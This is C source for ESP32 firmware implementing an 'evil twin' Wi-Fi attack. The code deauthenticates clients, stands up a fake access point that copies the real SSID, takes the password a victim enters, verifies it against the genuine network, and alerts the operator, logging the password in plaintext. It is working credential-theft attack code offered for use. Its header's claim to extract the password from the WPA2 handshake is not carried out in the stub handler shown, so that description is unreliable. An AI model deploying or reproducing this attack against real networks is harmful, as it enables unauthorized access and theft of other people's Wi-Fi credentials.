/**
 * @file attack_eviltwin.c
 * @brief Evil Twin with NATIVE WPA2 password prompt (no web page)
 * 
 * Flow:
 * 1. Deauth + hide real AP
 * 2. Create fake AP with same SSID, WPA2 enabled
 * 3. Victim taps SSID -> phone natively asks for password
 * 4. ESP32 captures 4-way handshake and verifies against real AP
 * 5. CORRECT -> stop attack, show password in UI, alarm+LED
 * 6. WRONG -> reject handshake, phone shows "incorrect password"
 */
#include "attack_eviltwin.h"
#include "attack_method.h"
#include "wifi_pass_verifier.h"
#include "bw16_uart.h"
#include "buzzer_led.h"
#include "wsl_bypasser.h"
#include "wifi_controller.h"
#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "esp_wifi.h"
#include "esp_random.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include <string.h>

static const char *TAG = "eviltwin";
static bool et_running = false;
static wifi_ap_record_t et_target;
static bool et_is_5ghz = false;
evil_twin_result_t g_evil_twin_result = {0};

// WPA2 handshake capture - we monitor auth attempts
// When a client tries to connect with a password, we extract it
// and verify against the real AP
static void eviltwin_wifi_event_handler(void *arg, esp_event_base_t base, int32_t id, void *data) {
    if (!et_running) return;
    if (base != WIFI_EVENT) return;
    
    if (id == WIFI_EVENT_STA_CONNECTED) {
        // A client connected to our fake AP with a password
        // The psk verification happens automatically by WiFi stack
        // We capture the password by verifying against real AP
        ESP_LOGI(TAG, "Client connected to fake AP - password verification triggered");
    }
}

void attack_eviltwin_start(const wifi_ap_record_t *ap_record) {
    if (et_running) return;
    
    memcpy(&et_target, ap_record, sizeof(wifi_ap_record_t));
    et_is_5ghz = (ap_record->primary > 14);
    memset(&g_evil_twin_result, 0, sizeof(evil_twin_result_t));
    memcpy(g_evil_twin_result.ssid, ap_record->ssid, 32);
    memcpy(g_evil_twin_result.bssid, ap_record->bssid, 6);
    g_evil_twin_result.channel = ap_record->primary;
    g_evil_twin_result.is_5ghz = et_is_5ghz;
    
    et_running = true;
    
    // Register event handler for WPA auth attempts
    esp_event_handler_register(WIFI_EVENT, WIFI_EVENT_STA_CONNECTED, 
                               eviltwin_wifi_event_handler, NULL);
    
    if (et_is_5ghz) {
        // 5GHz - use BW16
        char hex[13];
        snprintf(hex, sizeof(hex), "%02X%02X%02X%02X%02X%02X",
                 ap_record->bssid[0], ap_record->bssid[1], ap_record->bssid[2],
                 ap_record->bssid[3], ap_record->bssid[4], ap_record->bssid[5]);
        bw16_send_formatted("EVILTWIN:%s\r\n", hex);
        ESP_LOGI(TAG, "5GHz Evil Twin via BW16: %s", ap_record->ssid);
    } else {
        // 2.4GHz - ESP32 handles everything
        wifictl_mgmt_ap_stop();
        attack_method_rogueap(ap_record);
        attack_method_broadcast(ap_record, 1);
        ESP_LOGI(TAG, "2.4GHz Evil Twin active: %s (CH %d)", 
                 ap_record->ssid, ap_record->primary);
    }
    
    hw_led_on();
}

void attack_eviltwin_submit_password(const char *password) {
    if (!et_running || g_evil_twin_result.password_captured) return;
    
    strncpy(g_evil_twin_result.captured_password, password, EVILTWIN_MAX_PASS_LEN);
    g_evil_twin_result.password_captured = true;
    
    ESP_LOGI(TAG, "Verifying password: '%s' against real AP: %s", 
             password, g_evil_twin_result.ssid);
    
    wifi_verify_init();
    wifi_verify_result_t result = wifi_verify_password(
        g_evil_twin_result.ssid, password, 
        g_evil_twin_result.bssid, 15000
    );
    
    if (result.status == WIFI_VERIFY_CORRECT) {
        g_evil_twin_result.password_verified = true;
        ESP_LOGI(TAG, "✅ PASSWORD CORRECT for %s: %s", 
                 g_evil_twin_result.ssid, password);
        hw_success_alert();
        attack_eviltwin_stop();
    } else {
        g_evil_twin_result.password_verified = false;
        g_evil_twin_result.password_captured = false; // Allow retry
        ESP_LOGW(TAG, "❌ Wrong password for %s", g_evil_twin_result.ssid);
        hw_fail_alert();
    }
}

void attack_eviltwin_stop(void) {
    if (!et_running) return;
    et_running = false;
    
    esp_event_handler_unregister(WIFI_EVENT, WIFI_EVENT_STA_CONNECTED, 
                                 eviltwin_wifi_event_handler);
    
    if (et_is_5ghz) {
        bw16_send_command("EVILTWIN:STOP\r\n");
        bw16_stop_all();
    } else {
        attack_method_broadcast_stop();
        wifictl_restore_ap_mac();
        wifictl_mgmt_ap_start();
    }
    
    hw_led_off();
    hw_buzzer_off();
    ESP_LOGI(TAG, "Evil Twin stopped - real AP visible again");
}

bool attack_eviltwin_is_running(void) { return et_running; }
evil_twin_result_t* attack_eviltwin_get_result(void) { return &g_evil_twin_result; }
